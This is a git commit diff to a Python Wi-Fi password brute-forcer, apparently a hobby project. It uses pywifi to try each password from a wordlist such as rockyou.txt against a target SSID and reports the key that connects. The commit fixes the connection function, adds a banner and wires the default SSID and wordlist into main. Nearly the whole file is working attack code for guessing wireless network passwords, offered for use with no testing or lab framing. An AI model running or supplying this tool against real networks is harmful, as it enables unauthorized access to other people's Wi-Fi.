9e9f8c61670cc781bdb0e50d19a662104f70f1c2
Landry John MELI <landryjohnmeli@gmail.com>
2021-12-24 02:34:12 +0100

    correct wconnection function | removed subprocess module | added fancy text | remove cli clearing in main function | provided a wordlist template (rockyou.txt)

--- app.py
+++ app.py
@@ -1,11 +1,19 @@
 """
-    Wi-Fi cracker
+    Wi-Fi Brute Force Authenticator
 """
 
 # Import librairies
 import argparse, time, sys, os, platform, re, subprocess
 import pywifi
 import termcolor, pyfiglet
+
+# Fancy App Presentation 
+f = pyfiglet.Figlet(font='standard')
+print(termcolor.colored(f.renderText('WiFi Brute Force'), color='yellow'))
+print(termcolor.colored('Author: Landry John [https://github.com/landryjohn]', color='yellow'))
+print(termcolor.colored('Thanks: OpenSource Community', color='green'))
+
+input('Press enter to continue >')
 
 # Default settings  
 _ssid="WIFI-NT-SSID"
@@ -20,7 +28,7 @@ def attempt_login(ssid:str, wordlist_file:str) -> None:
             wconnection(ssid, password, step)
 
 def wconnection(ssid:str, password:str, wordlist_step:int) -> None: 
-    profile = pywifi.profile() # Create a new profile
+    profile = pywifi.Profile() # Create a new profile
     # Assign profile settings
     profile.ssid = ssid 
     profile.auth = pywifi.const.AUTH_ALG_OPEN
@@ -35,10 +43,10 @@ def wconnection(ssid:str, password:str, wordlist_step:int) -> None:
     time.sleep(2) # wait until 2 seconds
 
     if iface.status() == pywifi.const.IFACE_CONNECTED : 
-        print(termcolor.colored(f"Step {wordlist_step}: [*] Connected successfully to ssid={ssid}:key={password}", 'red'))
+        print(termcolor.colored(f"Step {wordlist_step}: [*] Connected successfully to ssid={ssid}:key={password}", 'green'))
         input()
     else :
-        print(termcolor.colored(f"Step {wordlist_step}: [!] Password {password} failed ! trying the next one.", 'green'))
+        print(termcolor.colored(f"Step {wordlist_step}: [!] Password {password} failed ! trying the next one.", 'red'))
 
 def main(ssid:str, wordlist:str):
     # Instantiate argument parser
@@ -66,26 +74,26 @@ def main(ssid:str, wordlist:str):
     
     # Verify wordlist parameter
     if os.path.exists(wordlist):
-        if 'win' in platform.system().lower(): 
-            subprocess.run(['cls'])
-        else : 
-            subprocess.run(['clear'])
+        # if 'win' in platform.system().lower(): 
+        #     os.system('cls')
+        # else : 
+        #     os.system('clear')
         attempt_login(ssid,wordlist)
     else : 
-        print(termcolor(f"[-] Error : File {wordlist} doesn't exist", 'red'))
+        print(termcolor.colored(f"[-] Error : File {wordlist} doesn't exist", 'red'))
 
 if __name__ == "__main__" : 
 
-    try: 
-        # Get the Wi-FIi interface 
-        wifi = pywifi.PyWiFi()
-        iface = wifi.interfaces()[0] # Get the first available wifi interface 
-        iface.disconnect() # Disconnect the interface to the current AP 
+    # try: 
+    # Get the Wi-FIi interface 
+    wifi = pywifi.PyWiFi()
+    iface = wifi.interfaces()[0] # Get the first available wifi interface 
+    iface.disconnect() # Disconnect the interface to the current AP 
         
-        main('dde','dede')
+    main(_ssid, _wordlist)
         
-    except Exception as error:
-        print("ERROR : " + error)
+    # except Exception as error:
+    #     print(error)
 
 
 
